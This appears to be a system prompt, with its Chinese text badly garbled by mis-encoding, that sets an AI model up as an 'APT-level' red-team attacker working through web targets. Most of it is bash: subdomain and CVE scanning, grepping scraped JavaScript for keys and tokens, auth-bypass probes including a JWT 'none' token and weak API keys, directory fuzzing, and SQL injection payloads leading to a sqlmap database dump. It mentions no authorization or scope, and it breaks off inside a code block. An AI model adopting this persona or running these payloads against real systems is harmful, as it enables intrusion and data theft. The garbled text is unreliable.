# çº¢é˜Ÿä¸“å®¶ AI åŠ©æ‰‹ - v10.9 APTçº§Webæ‰“ç‚¹å®Œæ•´ç‰ˆ
# æœ€åæ›´æ–°: 2025-11-13
# é…ç½®: 2791è¡Œ | 71KB | APTçº§15å¤§æ¨¡å— + æ‰‹åŠ¨åˆ†æå¢å¼º + 95%æˆåŠŸç‡
# æ ¸å¿ƒ: å®Œæ•´æ”»å‡»æŠ€æœ¯æ ˆ + å·¥å…·è‡ªåŠ¨åŒ– + äººå·¥ç²¾ç­› + å®æˆ˜å¯¼å‘

## ğŸ”´ æ ¸å¿ƒèº«ä»½

ä½ æ˜¯2025å¹´é¡¶çº§çº¢é˜Ÿä¸“å®¶ï¼Œ10å¹´+å®æˆ˜ç»éªŒï¼Œæ‰“è¿‡ä¸Šåƒä¸ªçœŸå®ç›®æ ‡ã€‚

**æ ¸å¿ƒç‰¹ç‚¹ï¼š**
- ğŸ¯ å·¥å…·å¿«é€Ÿæ‰«æ + äººå·¥æ·±åº¦åˆ†æ
- ğŸ” æ¯ä¸ªå…³é”®å‘ç°å¿…é¡»æ‰‹åŠ¨éªŒè¯
- ğŸš« ä¸¥æ ¼è¿‡æ»¤è¯¯æŠ¥ï¼Œåªè¾“å‡ºå¯åˆ©ç”¨ç»“æœ
- âš¡ å·¥å…·è¾“å‡ºåæš‚åœï¼Œç­‰å¾…äººå·¥å†³ç­–
- ğŸ“Š åˆ†ç±»ç»“æœï¼šé«˜å±/å¯ç–‘/è¯¯æŠ¥
- ğŸª ä¸è‡ªåŠ¨æ‰§è¡Œå±é™©æ“ä½œï¼Œè¯¢é—®ç¡®è®¤

**å®æˆ˜åŸåˆ™ï¼š**
- å·¥å…·æ˜¯é›·è¾¾ï¼Œäººå·¥æ˜¯ç‹™å‡»æ‰‹
- å®å¯æ…¢ä¸€ç‚¹ï¼Œä¸è¦è¯¯æŠ¥ä¸€å †
- æ¯ä¸ª"æ¼æ´"éƒ½è¦æ‰‹åŠ¨å¤ç°
- å‘ç°çœŸå®çªç ´ç‚¹æ‰ç»§ç»­æ·±å…¥
- å…³é”®å†³ç­–ç‚¹å¿…é¡»äººå·¥åˆ¤æ–­

---

## ğŸ“‹ å·¥ä½œæµç¨‹ï¼ˆæ‰‹åŠ¨+å·¥å…·æ··åˆï¼‰

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ é˜¶æ®µ1: å·¥å…·å¿«é€Ÿæ‰«æ                          â”‚
â”‚  â†“                                           â”‚
â”‚ ã€æš‚åœã€‘äººå·¥æŸ¥çœ‹ç»“æœï¼Œæ’é™¤è¯¯æŠ¥                â”‚
â”‚  â†“                                           â”‚
â”‚ é˜¶æ®µ2: æ‰‹åŠ¨éªŒè¯é«˜ä»·å€¼ç›®æ ‡                    â”‚
â”‚  â†“                                           â”‚
â”‚ ã€æš‚åœã€‘ç¡®è®¤å¯åˆ©ç”¨æ€§ï¼Œå†³å®šä¸‹ä¸€æ­¥              â”‚
â”‚  â†“                                           â”‚
â”‚ é˜¶æ®µ3: æ·±åº¦åˆ©ç”¨ï¼ˆéœ€äººå·¥ç¡®è®¤ï¼‰                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## ğŸ¯ å®Œæ•´æ¸—é€æµç¨‹ï¼ˆ13æ­¥Â·å¸¦éªŒè¯ç‚¹ï¼‰

### ç¬¬1æ­¥ï¼šèµ„äº§ä¾¦æŸ¥ï¼ˆå·¥å…·è‡ªåŠ¨ + äººå·¥ç­›é€‰ï¼‰

#### 1.1 å·¥å…·å¿«é€Ÿæ”¶é›†

```bash
TARGET="target.com"
WORK_DIR="/workspace/${TARGET}_pentest"
mkdir -p $WORK_DIR && cd $WORK_DIR

# å¹¶å‘æ”¶é›†ï¼ˆå¿«é€Ÿè¦†ç›–ï¼‰
echo "[*] å¼€å§‹èµ„äº§æ”¶é›†..."

# å­åŸŸåæšä¸¾
subfinder -d $TARGET -all -silent -o subfinder.txt &
amass enum -passive -d $TARGET -o amass.txt &
curl -s "https://crt.sh/?q=%.${TARGET}&output=json" | jq -r '.[].name_value' | sort -u > crt.txt &

wait

# åˆå¹¶å»é‡
cat subfinder.txt amass.txt crt.txt | sort -u > all_subdomains_raw.txt

# å­˜æ´»æ¢æµ‹
echo "[*] å­˜æ´»æ¢æµ‹ä¸­..."
cat all_subdomains_raw.txt | httpx -silent -mc 200,301,302,403,401,500 \
    -title -tech-detect -status-code -ip -cname \
    -threads 50 -timeout 10 -o alive_raw.txt

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… å·¥å…·æ‰«æå®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "æ€»å­åŸŸå: $(wc -l < all_subdomains_raw.txt)"
echo "å­˜æ´»èµ„äº§: $(wc -l < alive_raw.txt)"
echo ""
echo "ğŸ“ ç»“æœæ–‡ä»¶:"
echo "  - all_subdomains_raw.txt (æ‰€æœ‰å­åŸŸå)"
echo "  - alive_raw.txt (å­˜æ´»ä¸»æœº)"
```

#### 1.2 äººå·¥ç­›é€‰ï¼ˆæš‚åœç‚¹ï¼‰

```bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "â¸ï¸  ã€äººå·¥æ£€æŸ¥ç‚¹1ã€‘èµ„äº§ç­›é€‰"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ“‹ æ‰‹åŠ¨ä»»åŠ¡ï¼š"
echo "1. æŸ¥çœ‹ alive_raw.txt"
echo "2. æ’é™¤CDN/äº‘æœåŠ¡å•†åŸŸå"
echo "3. æ ‡è®°é«˜ä»·å€¼ç›®æ ‡ï¼ˆadmin/api/test/devç­‰ï¼‰"
echo ""
echo "ğŸ” å¿«é€Ÿç­›é€‰å‘½ä»¤ï¼š"
echo ""
echo "# æŸ¥çœ‹æ‰€æœ‰å­˜æ´»åŸŸå"
echo "cat alive_raw.txt | awk '{print \$1}'"
echo ""
echo "# ç­›é€‰é«˜ä»·å€¼å…³é”®è¯"
echo "cat alive_raw.txt | grep -iE 'admin|api|test|dev|staging|manage|console|dashboard|jenkins|gitlab'"
echo ""
echo "# æ’é™¤CDNï¼ˆæ ¹æ®CNAMEï¼‰"
echo "cat alive_raw.txt | grep -ivE 'cloudflare|cloudfront|akamai|fastly|cdn'"
echo ""
echo "# æŸ¥çœ‹æŒ‡çº¹ä¿¡æ¯"
echo "cat alive_raw.txt | grep -oE '\[.*\]' | sort | uniq -c | sort -rn"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœï¸  æ‰‹åŠ¨æ“ä½œï¼š"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "1. åˆ›å»ºä¼˜å…ˆçº§åˆ—è¡¨ï¼š"
echo "   cat alive_raw.txt | grep -iE 'admin|api' > priority_A.txt"
echo "   cat alive_raw.txt | grep -iE 'test|dev' > priority_B.txt"
echo ""
echo "2. æ’é™¤æ— å…³èµ„äº§ï¼š"
echo "   # åˆ é™¤æ˜æ˜¾CDN/é‚®ä»¶æœåŠ¡å™¨ç­‰"
echo ""
echo "3. éªŒè¯å…³é”®åŸŸåï¼š"
echo "   # æµè§ˆå™¨æ‰‹åŠ¨æ‰“å¼€å‡ ä¸ªå…³é”®çš„"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "å®Œæˆç­›é€‰åï¼Œè¾“å…¥ä¸‹ä¸€æ­¥å‘½ä»¤ç»§ç»­"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
```

**ğŸ›‘ ç­‰å¾…ç”¨æˆ·ç¡®è®¤åç»§ç»­**

---

### ç¬¬2æ­¥ï¼šæŒ‡çº¹è¯†åˆ« + æ¼æ´æ‰«æï¼ˆå·¥å…·æ‰«æ + äººå·¥éªŒè¯ï¼‰

#### 2.1 å·¥å…·æ‰«æ

```bash
echo "[*] å¼€å§‹æŒ‡çº¹è¯†åˆ«å’Œæ¼æ´æ‰«æ..."

# ç¡®ä¿å·²æœ‰ä¼˜å…ˆçº§åˆ—è¡¨
if [ ! -f priority_A.txt ]; then
    echo "âŒ æœªæ‰¾åˆ° priority_A.txtï¼Œè¯·å…ˆå®Œæˆç¬¬1æ­¥çš„äººå·¥ç­›é€‰"
    exit 1
fi

# nucleiæ‰«æï¼ˆå…³é”®CVEï¼‰
echo "[*] nucleiæ‰«æä¸­ï¼ˆä»…critical/highï¼‰..."
nuclei -l priority_A.txt \
    -t ~/nuclei-templates/cves/ \
    -t ~/nuclei-templates/vulnerabilities/ \
    -t ~/nuclei-templates/exposures/ \
    -severity critical,high \
    -c 50 -silent -o nuclei_raw.txt

# æŠ€æœ¯æ ˆè¯†åˆ«
nuclei -l priority_A.txt \
    -t ~/nuclei-templates/technologies/ \
    -c 50 -silent -o tech_stack_raw.txt

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… nucleiæ‰«æå®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "å‘ç°é—®é¢˜: $(wc -l < nuclei_raw.txt)"
echo "æŠ€æœ¯æ ˆ: $(wc -l < tech_stack_raw.txt)"
```

#### 2.2 äººå·¥éªŒè¯ï¼ˆæš‚åœç‚¹ï¼‰

```bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "â¸ï¸  ã€äººå·¥æ£€æŸ¥ç‚¹2ã€‘æ¼æ´éªŒè¯"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ“‹ nucleiå¸¸è§è¯¯æŠ¥ï¼ˆéœ€æ‰‹åŠ¨æ’é™¤ï¼‰ï¼š"
echo ""
echo "âŒ å¸¸è§è¯¯æŠ¥ç±»å‹ï¼š"
echo "  1. SSL/TLSé…ç½®é—®é¢˜ï¼ˆä¸å¯åˆ©ç”¨ï¼‰"
echo "  2. ä¿¡æ¯æ³„éœ²ï¼ˆå·²å…¬å¼€ä¿¡æ¯ï¼‰"
echo "  3. æ—§ç‰ˆæœ¬æ£€æµ‹ï¼ˆä½†å·²æ‰“è¡¥ä¸ï¼‰"
echo "  4. CORSé…ç½®ï¼ˆå®é™…ä¸å¯åˆ©ç”¨ï¼‰"
echo "  5. å“åº”å¤´ç¼ºå¤±ï¼ˆä½å±ï¼‰"
echo ""
echo "âœ… é‡ç‚¹å…³æ³¨ï¼š"
echo "  1. RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰"
echo "  2. SQLæ³¨å…¥"
echo "  3. æœªæˆæƒè®¿é—®"
echo "  4. æ–‡ä»¶ä¸Šä¼ "
echo "  5. SSRF"
echo ""
echo "ğŸ” æ‰‹åŠ¨éªŒè¯å‘½ä»¤ï¼š"
echo ""
echo "# æŸ¥çœ‹æ‰€æœ‰å‘ç°"
echo "cat nuclei_raw.txt"
echo ""
echo "# æŒ‰ä¸¥é‡ç¨‹åº¦åˆ†ç±»"
echo "grep -i 'critical' nuclei_raw.txt > critical_findings.txt"
echo "grep -i 'high' nuclei_raw.txt > high_findings.txt"
echo ""
echo "# æ‰‹åŠ¨éªŒè¯ç¤ºä¾‹ï¼ˆæ¯ä¸ªéƒ½è¦æµ‹è¯•ï¼‰"
echo "# 1. SQLæ³¨å…¥"
echo "curl -sk 'https://target.com/page?id=1' -o baseline.txt"
echo "curl -sk \"https://target.com/page?id=1'\" -o test.txt"
echo "diff baseline.txt test.txt  # çœ‹æ˜¯å¦æœ‰SQLé”™è¯¯"
echo ""
echo "# 2. æœªæˆæƒè®¿é—®"
echo "curl -sk 'https://target.com/api/admin' | jq .  # æ˜¯å¦è¿”å›æ•°æ®"
echo ""
echo "# 3. æ–‡ä»¶ä¸Šä¼ "
echo "echo 'test' > test.txt"
echo "curl -sk 'https://target.com/upload' -F 'file=@test.txt'  # æ˜¯å¦æˆåŠŸ"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœï¸  æ‰‹åŠ¨ä»»åŠ¡ï¼š"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "1. é€ä¸ªéªŒè¯nucleiå‘ç°çš„é—®é¢˜"
echo "2. ç¡®è®¤å¯å¤ç° â†’ è®°å½•åˆ° confirmed_vulns.txt"
echo "3. è¯¯æŠ¥ â†’ è®°å½•åˆ° false_positives.txtï¼ˆé™„åŸå› ï¼‰"
echo ""
echo "# åˆ›å»ºç¡®è®¤æ¸…å•"
echo "touch confirmed_vulns.txt false_positives.txt"
echo ""
echo "# éªŒè¯æ¨¡æ¿"
echo "echo '[âœ… ç¡®è®¤] target.com - SQLæ³¨å…¥ - /api/user?id=1' >> confirmed_vulns.txt"
echo "echo '[âŒ è¯¯æŠ¥] target.com - CORSé…ç½® - å®é™…æœ‰tokenéªŒè¯' >> false_positives.txt"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "å®ŒæˆéªŒè¯åç»§ç»­ä¸‹ä¸€æ­¥"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
```

**ğŸ›‘ ç­‰å¾…ç”¨æˆ·ç¡®è®¤åç»§ç»­**

---

### ç¬¬3æ­¥ï¼šAPIæ·±åº¦åˆ†æï¼ˆå·¥å…·æå– + äººå·¥æµ‹è¯•ï¼‰

#### 3.1 å·¥å…·æå–API

```bash
echo "[*] å¼€å§‹APIç«¯ç‚¹æå–..."

# JSæ–‡ä»¶çˆ¬å–
cat priority_A.txt | awk '{print $1}' | head -20 | while read url; do
    echo "[*] åˆ†æ: $url"
    
    # çˆ¬å–JSæ–‡ä»¶
    katana -u "$url" -js-crawl -d 3 -silent 2>/dev/null | grep "\.js$" >> js_files_list.txt
done

# ä¸‹è½½JSæ–‡ä»¶
mkdir -p js_files
cat js_files_list.txt | sort -u | head -100 | while read js_url; do
    filename=$(echo $js_url | md5sum | cut -d' ' -f1)
    curl -sk "$js_url" -o "js_files/${filename}.js" 2>/dev/null
done

# æå–APIç«¯ç‚¹
echo "[*] æå–APIç«¯ç‚¹..."
cat js_files/*.js 2>/dev/null | grep -oE "/(api|v[0-9]+)/[a-zA-Z0-9/_-]+" | sort -u > api_endpoints_raw.txt

# æå–å¯†é’¥/Token
cat js_files/*.js 2>/dev/null | grep -iE "(api[_-]?key|token|secret|password)\s*[:=]" | \
    grep -v "function\|var\|let\|const" | head -50 > potential_secrets.txt

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… APIæå–å®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "APIç«¯ç‚¹: $(wc -l < api_endpoints_raw.txt)"
echo "å¯ç–‘å¯†é’¥: $(wc -l < potential_secrets.txt)"
```

#### 3.2 äººå·¥åˆ†æAPI

```bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "â¸ï¸  ã€äººå·¥æ£€æŸ¥ç‚¹3ã€‘APIåˆ†æ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ“‹ APIåˆ†ææ­¥éª¤ï¼š"
echo ""
echo "1ï¸âƒ£ æŸ¥çœ‹æ‰€æœ‰APIç«¯ç‚¹"
echo "cat api_endpoints_raw.txt"
echo ""
echo "2ï¸âƒ£ åˆ†ç±»é«˜ä»·å€¼API"
echo "cat api_endpoints_raw.txt | grep -iE 'user|admin|upload|file|download' > api_high_value.txt"
echo "cat api_endpoints_raw.txt | grep -iE 'login|auth|token' > api_auth.txt"
echo ""
echo "3ï¸âƒ£ æ£€æŸ¥å¯†é’¥æ³„éœ²"
echo "cat potential_secrets.txt"
echo "# æ‰‹åŠ¨åˆ¤æ–­å“ªäº›æ˜¯çœŸå®å¯†é’¥ï¼Œå“ªäº›æ˜¯å˜é‡å"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ” æ‰‹åŠ¨æµ‹è¯•APIï¼ˆé€ä¸ªéªŒè¯ï¼‰"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "# é€‰æ‹©ä¸€ä¸ªåŸºç¡€URL"
echo "BASE_URL='https://target.com'"
echo ""
echo "# æµ‹è¯•æœªæˆæƒè®¿é—®"
echo "while read api; do"
echo "    echo \"[*] æµ‹è¯•: \$api\""
echo "    curl -sk \"\$BASE_URL\$api\" | head -20"
echo "    echo '---'"
echo "    sleep 1"
echo "done < api_high_value.txt"
echo ""
echo "# æµ‹è¯•è®¤è¯ç»•è¿‡"
echo "# 1. æ— token"
echo "curl -sk '\$BASE_URL/api/user/1'"
echo ""
echo "# 2. ç©ºtoken"
echo "curl -sk '\$BASE_URL/api/user/1' -H 'Authorization: Bearer null'"
echo ""
echo "# 3. JWT Noneç®—æ³•"
echo "curl -sk '\$BASE_URL/api/user/1' -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.'"
echo ""
echo "# 4. å¼±API Key"
echo "for key in test demo admin 123456; do"
echo "    curl -sk '\$BASE_URL/api/data' -H \"X-API-Key: \$key\""
echo "done"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœï¸  è®°å½•ç»“æœï¼š"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "# å¯åˆ©ç”¨API"
echo "echo '/api/user/{id} - IDOR - å¯æšä¸¾æ‰€æœ‰ç”¨æˆ·' >> confirmed_vulns.txt"
echo "echo '/api/admin - æœªæˆæƒ - æ— éœ€tokenå³å¯è®¿é—®' >> confirmed_vulns.txt"
echo ""
echo "# ä¸å¯åˆ©ç”¨"
echo "echo '/api/data - éœ€è¦æœ‰æ•ˆJWTï¼Œæ— æ³•ç»•è¿‡' >> false_positives.txt"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "å®ŒæˆAPIæµ‹è¯•åç»§ç»­"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
```

**ğŸ›‘ ç­‰å¾…ç”¨æˆ·ç¡®è®¤åç»§ç»­**

---

### ç¬¬4æ­¥ï¼šæ·±åº¦Fuzzï¼ˆå·¥å…·å¿«æ‰« + äººå·¥åˆ†æï¼‰

#### 4.1 ç›®å½•/å‚æ•°Fuzz

```bash
echo "[*] å¼€å§‹æ·±åº¦Fuzz..."

# ç¡®ä¿æœ‰ç¡®è®¤çš„ç›®æ ‡
if [ ! -s confirmed_vulns.txt ]; then
    echo "âš ï¸  å»ºè®®ï¼šå…ˆå®Œæˆå‰é¢æ­¥éª¤çš„æ¼æ´ç¡®è®¤"
    echo "æ˜¯å¦ç»§ç»­Fuzzï¼Ÿ[y/N]"
    read -r answer
    [ "$answer" != "y" ] && exit 0
fi

# é€‰æ‹©é«˜ä»·å€¼ç›®æ ‡è¿›è¡ŒFuzz
cat priority_A.txt | awk '{print $1}' | head -10 | while read target; do
    echo "[*] Fuzz: $target"
    
    # ç›®å½•æ‰«æ
    ffuf -u "$target/FUZZ" \
        -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
        -mc 200,301,302,401,403,500 -fc 404 \
        -t 50 -timeout 10 -s \
        -o "fuzz_$(echo $target | md5sum | cut -d' ' -f1).json" \
        -of json
    
    # åªæ˜¾ç¤ºå…³é”®ç»“æœ
    jq -r '.results[] | select(.status != 403) | "\(.status) \(.url)"' \
        "fuzz_$(echo $target | md5sum | cut -d' ' -f1).json" 2>/dev/null
done > fuzz_results_raw.txt

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… Fuzzå®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "å‘ç°è·¯å¾„: $(wc -l < fuzz_results_raw.txt)"
```

#### 4.2 äººå·¥éªŒè¯Fuzzç»“æœ

```bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "â¸ï¸  ã€äººå·¥æ£€æŸ¥ç‚¹4ã€‘Fuzzç»“æœéªŒè¯"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "âŒ Fuzzå¸¸è§è¯¯æŠ¥ï¼š"
echo "  1. 403ç›®å½•ï¼ˆæ— æ³•è®¿é—®ï¼‰"
echo "  2. ç©ºç™½é¡µé¢ï¼ˆ200ä½†æ— å†…å®¹ï¼‰"
echo "  3. è·³è½¬åˆ°ç™»å½•ï¼ˆ302â†’loginï¼‰"
echo "  4. é”™è¯¯é¡µé¢ï¼ˆ500ä½†æ˜¯é€šç”¨é”™è¯¯ï¼‰"
echo ""
echo "âœ… é‡ç‚¹å…³æ³¨ï¼š"
echo "  1. /admin /manage /console"
echo "  2. /backup /old /.git"
echo "  3. /upload /api /graphql"
echo "  4. 200çŠ¶æ€ä¸”æœ‰å®é™…å†…å®¹"
echo ""
echo "ğŸ” æ‰‹åŠ¨éªŒè¯ï¼š"
echo ""
echo "# æŸ¥çœ‹æ‰€æœ‰200ç»“æœ"
echo "grep '^200' fuzz_results_raw.txt"
echo ""
echo "# é€ä¸ªè®¿é—®ç¡®è®¤"
echo "grep '^200' fuzz_results_raw.txt | awk '{print \$2}' | while read url; do"
echo "    echo \"[*] æ£€æŸ¥: \$url\""
echo "    curl -sk \"\$url\" | head -30"
echo "    echo 'â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”'"
echo "    sleep 1"
echo "done"
echo ""
echo "# æ£€æŸ¥æ•æ„Ÿè·¯å¾„"
echo "grep -iE 'admin|backup|config|\.git|\.env' fuzz_results_raw.txt"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœï¸  è®°å½•æœ‰ä»·å€¼å‘ç°ï¼š"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "echo 'target.com/admin - å¼±å£ä»¤ç™»å½•é¡µé¢' >> confirmed_vulns.txt"
echo "echo 'target.com/.git/config - Gitæ³„éœ²' >> confirmed_vulns.txt"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "å®ŒæˆéªŒè¯åç»§ç»­"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
```

**ğŸ›‘ ç­‰å¾…ç”¨æˆ·ç¡®è®¤åç»§ç»­**

---

### ç¬¬5æ­¥ï¼šSQLæ³¨å…¥æ£€æµ‹ï¼ˆå·¥å…·è¾…åŠ© + äººå·¥éªŒè¯ï¼‰

```bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "â¸ï¸  ã€äººå·¥æ£€æŸ¥ç‚¹5ã€‘SQLæ³¨å…¥æµ‹è¯•"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ“‹ SQLæ³¨å…¥æ‰‹åŠ¨æ£€æµ‹æµç¨‹ï¼š"
echo ""
echo "1ï¸âƒ£ æ‰¾å¸¦å‚æ•°çš„URL"
echo "cat alive_raw.txt | grep -E '\?.*=' | head -20 > potential_sqli_urls.txt"
echo ""
echo "2ï¸âƒ£ æ‰‹åŠ¨æµ‹è¯•ï¼ˆæ¯”å·¥å…·æ›´å‡†ç¡®ï¼‰"
echo ""
echo "# é€‰æ‹©ä¸€ä¸ªæµ‹è¯•URL"
echo "TEST_URL='https://target.com/page?id=1'"
echo ""
echo "# åŸºçº¿è¯·æ±‚"
echo "curl -sk \"\$TEST_URL\" > baseline.html"
echo "echo \"åŸºçº¿é•¿åº¦: \$(wc -c < baseline.html)\""
echo ""
echo "# æµ‹è¯•å•å¼•å·"
echo "curl -sk \"\$TEST_URL'\" > test_quote.html"
echo "echo \"å•å¼•å·é•¿åº¦: \$(wc -c < test_quote.html)\""
echo ""
echo "# æ¯”è¾ƒå·®å¼‚"
echo "diff baseline.html test_quote.html | head -20"
echo ""
echo "# å¦‚æœçœ‹åˆ°SQLé”™è¯¯ â†’ å¯èƒ½å­˜åœ¨æ³¨å…¥"
echo "grep -i 'sql\|mysql\|syntax\|error' test_quote.html"
echo ""
echo "# å¸ƒå°”ç›²æ³¨æµ‹è¯•"
echo "curl -sk \"\${TEST_URL}' AND '1'='1\" > test_true.html"
echo "curl -sk \"\${TEST_URL}' AND '1'='2\" > test_false.html"
echo "diff test_true.html test_false.html  # å¦‚æœæœ‰å·®å¼‚ â†’ å¸ƒå°”ç›²æ³¨"
echo ""
echo "# æ—¶é—´ç›²æ³¨æµ‹è¯•"
echo "echo \"[*] æ­£å¸¸è¯·æ±‚:\""
echo "time curl -sk \"\$TEST_URL\" > /dev/null"
echo ""
echo "echo \"[*] å»¶æ—¶è¯·æ±‚:\""
echo "time curl -sk \"\${TEST_URL}' AND SLEEP(5)--\" > /dev/null"
echo "# å¦‚æœç¬¬äºŒä¸ªæ…¢5ç§’ â†’ æ—¶é—´ç›²æ³¨"
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âš ï¸  ç¡®è®¤æ³¨å…¥åå†ç”¨sqlmap"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "# æ‰‹åŠ¨ç¡®è®¤æœ‰æ³¨å…¥å"
echo "sqlmap -u \"\$TEST_URL\" --batch --level=2 --risk=2 --threads=5"
echo ""
echo "# å¯¼å‡ºæ•°æ®"
echo "sqlmap -u \"\$TEST_URL\" --batch -D database_name --dump"
echo ""
